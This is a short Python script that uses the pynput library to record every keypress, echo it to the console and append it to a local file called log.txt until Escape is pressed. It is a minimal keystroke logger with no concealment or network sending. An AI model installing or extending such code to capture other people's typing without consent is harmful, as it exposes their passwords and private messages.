from pynput import keyboard

def on_press(key):  

    try:
        print('{0}'.format(
            key.char))
        log = str(key.char) + " "
    except AttributeError:
        print('{0}'.format(
            key))
        log = str(key) + " "
    finally:
        with open("log.txt", "a") as file:    
            file.write(log)
            if key == keyboard.Key.esc:
                    return False

# Collect events until released
with keyboard.Listener(
        on_press=on_press) as listener:
    listener.join()
